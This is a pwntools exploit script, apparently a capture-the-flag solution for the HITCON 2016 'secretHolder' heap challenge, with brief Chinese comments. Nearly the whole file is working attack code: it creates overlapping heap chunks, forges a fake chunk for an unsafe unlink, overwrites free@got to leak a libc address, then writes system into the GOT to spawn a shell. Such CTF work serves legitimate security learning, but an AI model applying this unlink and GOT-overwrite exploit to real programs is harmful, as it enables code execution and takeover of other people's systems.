from pwn import *

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')

elf = ELF('./secretHolder_hitcon_2016')

context.log_level = 'debug'
debug = 1

if debug:
    io = process('./secretHolder_hitcon_2016')
else:
    io = remote('node4.buuoj.cn',27890)

def p():
    gdb.attach(proc.pidof(io)[0])

one_gadget = [0x45226,0x4527a,0xf03a4,0xf1247]

def new(idx,content):
    io.sendlineafter(b"Renew secret",b'1')
    io.sendlineafter(b"Huge secret",str(idx))
    io.sendafter(b"Tell me your secret:",content)

def delete(idx):
    io.sendlineafter(b"Renew secret",b'2')
    io.sendlineafter(b"Huge secret",str(idx))

def edit(idx,content):
    io.sendlineafter(b"Renew secret",b'3')
    io.sendlineafter(b"Huge secret",str(idx))
    io.sendafter(b"Tell me your secret:",content)

small_mem = 0x6020b0
big_mem = 0x6020a0

new(1,b'AAAA')
delete(1) # chunk合并到top里面
new(2,b'AAAA') # 从top开始切，返回Small_mem即Small_mem 跟Big_mem相等
delete(1)#相当于又只有top了
new(1,b'aaaa') # overlapping成功,可以溢出
new(3,b'aaaa')
delete(3)
new(3,b'aaaa')
p()

# 伪造small_mem 的 fack chunk
fack_header = small_mem
fack_fb = fack_header - 0x18 
fack_bk = fack_header - 0x10
over_flow = p64(0) + p64(0x21) + p64(fack_fb) + p64(fack_bk)
over_flow += p64(0x20) + p64(0x61a90)
edit(2,over_flow)
delete(3) # unlink()
p()

#泄漏libc
libc_base = 0

## 修改 free@got.plt
payload_addr = elf.got['free']
payload = p64(elf.plt['puts'])
over_flow =  b'/bin/sh' + b'\x00' #binsh
over_flow += p64(0x602098) # 覆盖0x6020a0 idx = 2 
over_flow += p64(elf.got['puts'])  # 覆盖0x6020a8
over_flow += p64(payload_addr) # 覆盖0x6020b0
edit(1,over_flow) # small_mem 0x6020b0
edit(1,payload)

delete(3) # puts(puts@got)
libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - libc.symbols['puts']
success("libc_base -->" + hex(libc_base))
p()

# 修改free@got为one_gadget)
payload = p64(libc.symbols['system'] + libc_base)
edit(1,payload)

p()
delete(2)

io.interactive()

